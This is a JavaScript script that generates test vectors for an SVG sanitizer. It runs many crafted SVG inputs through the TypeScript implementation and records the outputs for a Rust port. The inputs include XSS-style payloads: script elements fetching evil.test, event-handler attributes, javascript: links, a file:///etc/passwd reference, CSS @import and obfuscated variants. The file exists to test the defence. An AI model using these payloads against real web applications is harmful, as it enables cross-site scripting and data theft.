// Regenerates sanitize-svg.json from the TypeScript sanitizer, the oracle of `vault::svg`:
//   cd apps/desktop && npx tsx ../../crates/memry-desktop/tests/fixtures/gen-svg-vectors.mjs
// Each case is the input bytes (`input`, or `inputBase64` when they are not UTF-8) and what
// `sanitizeSvgBytes` returned for them (`output`, null when no svg root survived).
// A larger differential run, not committed: SVG_SOUPS=100000 SVG_SEED=7 SVG_TOKENS=200
// SVG_OUT=/tmp/svg.json,
// then `MEMRY_SVG_VECTORS=/tmp/svg.json cargo test -p memry-desktop --test sanitize_svg_vectors
// -- --ignored`.
import { writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const ns = await import('../../../../packages/shared/src/sanitize-svg.ts')
const { sanitizeSvgBytes } = ns.default ?? ns

const here = dirname(fileURLToPath(import.meta.url))

// The cases of packages/shared/src/sanitize-svg.test.ts.
const suite = [
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 4h16v16H4z" fill="#ff671a"/><circle cx="12" cy="12" r="4"/></svg>',
  '<svg><script>fetch("https://evil.test")</script><rect/></svg>',
  '<svg xmlns:svg="http://www.w3.org/2000/svg"><svg:script>alert(1)</svg:script><xhtml:script>alert(2)</xhtml:script><svg:foreignObject><b>markup</b></svg:foreignObject><a:b:script>alert(3)</a:b:script><script>alert(4)</svg:script><rect/></svg>',
  '<svg><rect/><foreignObject><b onclick="x()">trailing</b></svg>',
  '<svg><foreignObject><body onload="x()">hi</body></foreignObject><g/></svg>',
  '<svg OnLoad="alert(1)"><rect onerror=\'alert(2)\' onclick=alert(3) fill="red"/></svg>',
  '<svg><use xlink:href="#glyph"/><use href="https://evil.test/x.svg#a"/><image href="file:///etc/passwd"/><image src="//evil.test/x.png"/><rect href="javascript:alert(1)"/></svg>',
  '<svg><a href="https://evil.test"><path d="M0 0"/></a></svg>',
  '<svg><rect style="fill:url(https://evil.test/x)"/><g style="fill:red"/></svg>',
  '<svg><style>@import url(https://evil.test/x.css);</style><rect/></svg>',
  '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><svg><text>&lol2;</text></svg>',
  '<svg><rect><animate attributeName="fill" to="url(https://evil.test/x.png)"/><set attributeName="fill" to="javascript:alert(1)"/><animate attributeName="opacity" values="0;1"/></rect></svg>',
  '<svg><rect style="width:expr\tession(alert(1))"/><g style="fill:red"/></svg>',
  '<svg><title>Logo</title><desc>A logo</desc><defs><linearGradient id="grad"><stop offset="0"/></linearGradient><clipPath id="clip"><rect/></clipPath><mask id="m"><rect/></mask></defs><style>.a{fill:url(#grad)}</style><linearGradient id="grad2" xlink:href="#grad"/><use xlink:href="#glyph" clip-path="url(#clip)" style="fill:url(#grad)"/></svg>',
  '<svg onload="x()"><svg:script>alert(1)</svg:script><a href="https://evil.test"><path d="M0 0"/></a><use xlink:href="#g"/><style>.a{fill:url(#g)}</style></svg>',
  '<svg><use href="#a"><animate attributeName="href" to="javascript:x"/></use></svg>',
  '<html><script>alert(1)</script></html>',
  'not an image at all',
  '<foreignObject/>',
  '<svg><rect onclick="x()"/></svg>'
]

// One case per branch of the scanners in vault/svg.
const edges = [
  '',
  '<svg>',
  '<svg/>',
  '<svg\u00a0x="1">',
  '<svg\ufeff>',
  '<SVG viewBox="0 0 1 1"></SVG>',
  '<svg:svg/>',
  '<a:b.c-d:svg>',
  '<1a:svg>',
  '<svgx>',
  '<svg',
  // Comments, declarations, instructions, CDATA.
  '<svg><!-- a --><!-- b --></svg>',
  '<svg><!--> x --></svg>',
  '<svg><!---> x --></svg>',
  '<svg><!-- unclosed <rect/></svg>',
  '<!DOCTYPE svg><svg/>',
  '<!doctype svg [ <!ENTITY a "b"> ]><svg/>',
  '<!DOCTYPE[>x]><svg/>',
  '<!DOCTYPE[>x<!DOCTYPE[>y]><svg/>',
  '<!DOCTYPE x[ no close bracket > <svg/>',
  '<!DOCTYPE x[ a ] b ] > <svg/>',
  '<!DOCTYPE x[ ]',
  '<!DOCTYPE <!DOCTYPE x[ > ] <svg/>',
  '<!DOCTYPE',
  '<!ENTITY x "y"><svg/>',
  '<!entity x><!ENTITY y',
  '<?xml?><?pi <svg/>',
  '<?>?><svg/>',
  '<svg><![CDATA[<script>x</script>]]><rect/></svg>',
  '<svg><![cdata[x]]></svg>',
  '<svg><![CDATA[ unclosed <rect/></svg>',
  // Forbidden elements.
  '<svg><script/><rect/></svg>',
  '<svg><script a="/>"><rect/></svg>',
  '<svg><script x/ ><rect/></svg>',
  '<svg><scriptx>keep</scriptx></svg>',
  '<svg><script:script>x</script:script></svg>',
  '<svg><script:scriptx>y</svg>',
  '<svg><SCRIPT>x</ScRiPt ></svg>',
  '<svg><script>a</script\n></svg>',
  '<svg><script>a</ script></svg>',
  '<svg><\u017Fcript>x</\u017Fcript></svg>',
  '<svg></script><rect/></svg>',
  '<svg></svg:script foo><rect/></svg>',
  '<svg></script',
  '<svg><iframe src=x><embed/><object></object><handler>h</handler></svg>',
  '<svg><foreignobject>x</FOREIGNOBJECT></svg>',
  '<svg><script <script>x</script></svg>',
  '<svg><script>x</script><script>y</svg>',
  '<svg><embed>x<embed/></svg>',
  // Style elements.
  '<svg><style>.a{fill:red}</style></svg>',
  '<svg><style>.a{fill:url(#x)}</style></svg>',
  '<svg><style>.a{fill:url("#x")}</style></svg>',
  "<svg><style>.a{fill:url('x')}</style></svg>",
  '<svg><style>.a{fill:url(x)}</style></svg>',
  '<svg><style>@IMPORT x;</style></svg>',
  '<svg><style media="x>y">.a{}</style></svg>',
  '<svg><style>unclosed .a{fill:url(x)}<rect/></svg>',
  '<svg><style <style>u</style></svg>',
  '<svg><svg:style>.a{background:url(http://x)}</svg:style></svg>',
  '<svg><style>.a{}</style ><style>@import x</style></svg>',
  // Tags and names.
  '<svg><a"b "c><rect/></svg>',
  '<svg><g"x>',
  '<svg><g a="unclosed></svg>',
  "<svg><g a='x\"y'/></svg>",
  '<svg><g a=b/></svg>',
  '<svg><g a = "b" c d=e f=`g`/></svg>',
  '<svg><g a=""/><g b=\'\'/></svg>',
  '<svg><g a="x"b="y"/></svg>',
  '<svg><g =x/></svg>',
  '<svg><g a= /></svg>',
  '<svg><g\n/>',
  '<svg>< g/></svg>',
  '<svg><1g/></svg>',
  '<svg></g x="y"></svg>',
  '<svg><g/ x></svg>',
  '<svg><g / ></svg>',
  '<svg><g x="1" / ></svg>',
  '<svg><g<a>></svg>',
  '<svg><a<b c="d">/></svg>',
  '<svg><g x=">"/></svg>',
  "<svg><g x='>'/></svg>",
  '<svg><g x="\'"/></svg>',
  '<svg><path d="M0 0" /></svg>',
  // Attributes.
  '<svg><g ONMOUSEOVER="x" on="y" onx/></svg>',
  '<svg><use href="#a" xlink:href=" #b" src="data:image/png;base64,AAA" xml:href="DATA:IMAGE/JPG;BASE64,x" xlink:src="data:image/svg+xml;base64,x"/></svg>',
  '<svg><use href="java\tscript:x"/><use href="  "/><use href=""/></svg>',
  '<svg><use href="data:image/png;baſe64,x"/></svg>',
  '<svg><g xlink:base="x" xml:base="y" XML:BASE="z"/></svg>',
  '<svg><g style="fill:url(#a) url(b)"/><g style="fill:URL(#A)"/><g style="x:url()"/></svg>',
  '<svg><g style="x:url(\'#a\')"/><g style=\'x:url("b")\'/></svg>',
  '<svg><g style="a:java\nscript:x"/><g style="@im port"/></svg>',
  '<svg><animate to="#x" from="//x" values="a:b" by="1"/></svg>',
  '<svg><animate to="\u00a0javascript:x"/><animate to=" //x"/><animate to="x"/></svg>',
  '<svg><set svg:to="url(#a)" x:from="url(http://x)"/></svg>',
  '<svg><animateMotion values="m:1"/><animateTransform by="url(#x)"/></svg>',
  '<svg><animate attributeName = "xlink:HREF" to="#x"/><animate attributeName="hrefx"/></svg>',
  '<svg><animate xattributeName="href"/><animate attributeName=\'src\'/><animate attributeName="xlink:src"/></svg>',
  '<svg><g attributeName="href"/></svg>',
  // Unicode: whitespace, case folding, astral characters.
  '<svg><g\u2028a="1"\u3000b="2"/></svg>',
  '<svg><g a\u00a0=\u00a0"1"/></svg>',
  '<svg><\u212Aeygen/><g xlin\u212A:href="http://x"/></svg>',
  '<svg><g \u0130d="x"/><\u0130mage/></svg>',
  '<svg><g a="\u{1F600}" \u{1F600}="b"/>\u{1F600}</svg>',
  '\u{1F600}<svg/>\u{1F600}'
]

// Seeded token soups: every construct the passes look for, in random order.
const tokens = [
  '<',
  '>',
  '/',
  '"',
  "'",
  '=',
  ' ',
  '\t',
  '\n',
  '\u00a0',
  '\ufeff',
  '\u2028',
  '#',
  ':',
  '[',
  ']',
  '!',
  '?',
  '-',
  '`',
  ')',
  '<!--',
  '-->',
  '<!DOCTYPE',
  '<!doctype',
  '<!ENTITY',
  '<!entity',
  '<?',
  '?>',
  '<![CDATA[',
  ']]>',
  '<svg',
  '<SVG',
  'svg',
  '</svg>',
  'svg:',
  'xlink:',
  'a:',
  'b.c-d:',
  '_x:',
  '<script',
  '</script',
  'script',
  '\u017Fcript',
  '<foreignObject',
  'foreignobject',
  '<iframe',
  '<embed',
  '<object',
  '<handler',
  '</handler',
  '<style',
  '</style',
  'style',
  '<a',
  '</a',
  'a',
  '<animate',
  '<set',
  '<animateTransform',
  'animateMotion',
  'attributeName',
  'attributename=',
  'href',
  'xlink:href',
  'src',
  'xml:base',
  'on',
  'onload',
  'OnClick',
  'to',
  'from',
  'values',
  'by',
  'style=',
  'href=',
  'url(',
  'url(#',
  "url('#",
  'url("x',
  'expression(',
  'expr\tession(',
  'javascript:',
  'java\tscript:',
  '@import',
  'data:image/png;base64,',
  'DATA:IMAGE/JPEG;BASE64,',
  'data:text/html,',
  '//',
  'http:',
  'x',
  'y',
  '1',
  '\u00e9',
  '\u{1F600}',
  '\u212A',
  '\u0130',
  '<rect',
  '<path d="M0 0"',
  '/>',
  '<g>',
  '</g>'
]

function mulberry32(seed) {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

const random = mulberry32(Number(process.env.SVG_SEED ?? 3529))
const soups = Array.from({ length: Number(process.env.SVG_SOUPS ?? 1500) }, () => {
  const count = 1 + Math.floor(random() * Number(process.env.SVG_TOKENS ?? 32))
  let text = random() < 0.5 ? '<svg>' : ''
  for (let i = 0; i < count; i++) text += tokens[Math.floor(random() * tokens.length)]
  return text
})

// Bytes that are not UTF-8 decode to U+FFFD on both sides.
const bytes = [
  Buffer.from([0x3c, 0x73, 0x76, 0x67, 0xff, 0x3e]),
  Buffer.from([
    0x3c, 0x73, 0x76, 0x67, 0x3e, 0xc3, 0x28, 0xe2, 0x82, 0x3c, 0x2f, 0x73, 0x76, 0x67, 0x3e
  ]),
  Buffer.from([0xef, 0xbb, 0xbf, 0x3c, 0x73, 0x76, 0x67, 0x2f, 0x3e]),
  Buffer.from([
    0x3c, 0x67, 0x20, 0x61, 0x3d, 0x22, 0xf0, 0x9f, 0x98, 0x3c, 0x73, 0x76, 0x67, 0x2f, 0x3e
  ])
]

const isUtf8 = (buffer) => Buffer.from(buffer.toString('utf8'), 'utf8').equals(buffer)
const toCase = (name, input) => {
  const out = sanitizeSvgBytes(input)
  return {
    name,
    ...(isUtf8(input)
      ? { input: input.toString('utf8') }
      : { inputBase64: input.toString('base64') }),
    output: out === null ? null : out.toString('utf8')
  }
}

const cases = [
  ...suite.map((text, i) => toCase(`suite-${i}`, Buffer.from(text, 'utf8'))),
  ...edges.map((text, i) => toCase(`edge-${i}`, Buffer.from(text, 'utf8'))),
  ...bytes.map((buffer, i) => toCase(`bytes-${i}`, buffer)),
  ...soups.map((text, i) => toCase(`soup-${i}`, Buffer.from(text, 'utf8')))
]
writeFileSync(
  process.env.SVG_OUT ?? join(here, 'sanitize-svg.json'),
  JSON.stringify({ cases }, null, 1) + '\n'
)
console.log(`wrote ${cases.length} cases`)
